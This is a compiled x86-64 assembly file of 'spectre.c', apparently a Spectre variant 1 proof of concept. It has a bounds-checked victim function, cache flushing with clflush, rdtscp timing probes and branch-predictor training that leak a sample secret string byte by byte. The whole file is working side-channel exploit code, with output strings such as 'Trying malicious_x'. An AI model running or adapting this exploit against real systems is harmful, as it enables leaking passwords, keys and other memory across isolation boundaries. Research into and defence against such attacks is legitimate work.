	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rcx
	xorl	%eax, %eax
	cmpq	%rdi, %rcx
	seta	%al
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.LBB1_5
# %bb.1:
	addl	$-1, %edi
	js	.LBB1_5
# %bb.2:
	movb	temp(%rip), %al
	movslq	%edi, %rcx
	leaq	array1(%rip), %rdx
	leaq	array2(%rip), %rsi
	.p2align	4, 0x90
.LBB1_3:                                # =>This Inner Loop Header: Depth=1
	movzbl	(%rcx,%rdx), %edi
	shlq	$9, %rdi
	andb	(%rdi,%rsi), %al
	addq	$-1, %rcx
	testl	%ecx, %ecx
	jns	.LBB1_3
# %bb.4:
	movb	%al, temp(%rip)
.LBB1_5:
	retq
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$24, %rsp
	.cfi_def_cfa_offset 80
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rdi, 16(%rsp)                  # 8-byte Spill
	leaq	results(%rip), %r14
	movl	$1024, %edx                     # imm = 0x400
	movq	%r14, %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %r12d                     # imm = 0x3E7
	leaq	array2(%rip), %r13
	jmp	.LBB2_1
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_1 Depth=1
	leal	-1(%r12), %eax
	cmpl	$1, %r12d
	movl	%eax, %r12d
	jbe	.LBB2_12
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_7 Depth 2
	movq	%r14, %rbp
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	(%rax,%r13)
	addq	$512, %rax                      # imm = 0x200
	cmpq	$131072, %rax                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	%r12d, %eax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r15d
	movq	%r15, %rbx
	xorq	16(%rsp), %rbx                  # 8-byte Folded Reload
	movl	$29, %r14d
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	%r14d, %eax
	movl	$2863311531, %ecx               # imm = 0xAAAAAAAB
	imulq	%rcx, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r14d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rbx, %rdi
	xorq	%r15, %rdi
	callq	victim_function
	subl	$1, %r14d
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	clflush	array1_size(%rip)
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB2_13
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$13, %edi
	movq	%rbp, %r14
	leaq	array1(%rip), %r8
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzbl	%dil, %ebp
	movq	%rbp, %rbx
	shlq	$9, %rbx
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbx,%r13), %eax
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$50, %rdx
	ja	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%r12d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	(%rdx,%r8), %dil
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%ebp, %eax
	addl	$1, (%r14,%rax,4)
	jmp	.LBB2_10
.LBB2_12:
	xorl	%ecx, results(%rip)
	addq	$24, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rsi, 32(%rsp)                  # 8-byte Spill
	movl	%edi, 28(%rsp)                  # 4-byte Spill
	movq	stdin@GOTPCREL(%rip), %r14
	leaq	.L.str.6(%rip), %r15
	leaq	results(%rip), %rbx
	leaq	.L.str.7(%rip), %r12
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_1 Depth=1
	xorl	%eax, %eax
	callq	getpid@PLT
	leaq	.L.str.9(%rip), %rdi
	leaq	check+33(%rip), %rsi
	movl	%eax, %edx
	xorl	%eax, %eax
	callq	printf@PLT
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
	movq	(%r14), %rdi
	callq	getc@PLT
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_14
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_15
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movq	%rdx, %rsi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	leaq	array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, 16(%rsp)
	callq	strlen@PLT
	movl	%eax, 12(%rsp)
	movl	$131072, %edx                   # imm = 0x20000
	leaq	array2(%rip), %rdi
	movl	$1, %esi
	callq	memset@PLT
	cmpl	$3, 28(%rsp)                    # 4-byte Folded Reload
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	movq	32(%rsp), %rbp                  # 8-byte Reload
	movq	8(%rbp), %rdi
	leaq	.L.str.2(%rip), %rsi
	leaq	16(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	leaq	array1(%rip), %rax
	subq	%rax, 16(%rsp)
	movq	16(%rbp), %rdi
	leaq	.L.str.3(%rip), %rsi
	leaq	12(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	movq	16(%rsp), %rsi
	movl	12(%rsp), %edx
	leaq	.L.str.4(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	movl	12(%rsp), %esi
	leaq	.L.str.5(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	12(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, 12(%rsp)
	testl	%eax, %eax
	jle	.LBB3_1
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xorl	%ebp, %ebp
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_8 Depth=2
	addq	$1, %rbp
	movl	$10, %edi
	callq	putchar@PLT
	movl	12(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, 12(%rsp)
	testl	%eax, %eax
	jle	.LBB3_1
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
	movq	16(%rsp), %rsi
	movq	secret(%rip), %rax
	movsbl	(%rax,%rbp), %ecx
	movq	%r15, %rdi
	movl	%ecx, %edx
	xorl	%eax, %eax
	callq	printf@PLT
	movq	16(%rsp), %rdi
	leaq	1(%rdi), %rax
	movq	%rax, 16(%rsp)
	callq	readMemoryByte
	xorl	%r13d, %r13d
	jmp	.LBB3_9
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_9 Depth=3
	addq	$1, %r13
	cmpq	$255, %r13
	je	.LBB3_13
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	movl	(%rbx,%r13,4), %edx
	movl	%edx, %eax
	subl	4(%rbx,%r13,4), %eax
	jle	.LBB3_12
# %bb.10:                               #   in Loop: Header=BB3_9 Depth=3
	cmpl	$101, %eax
	jl	.LBB3_12
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	movq	%r12, %rdi
	movl	%r13d, %esi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	4(%rbx,%r13,4), %edx
	leal	1(%r13), %esi
	movq	%r12, %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	jmp	.LBB3_12
.LBB3_15:
	xorl	%eax, %eax
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
	.p2align	4
array2:
	.zero	131072
	.size	array2, 131072

	.type	results,@object                 # @results
	.local	results
	.comm	results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.size	.L.str.6, 55

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"result[%d]=%d "
	.size	.L.str.7, 15

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.9, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
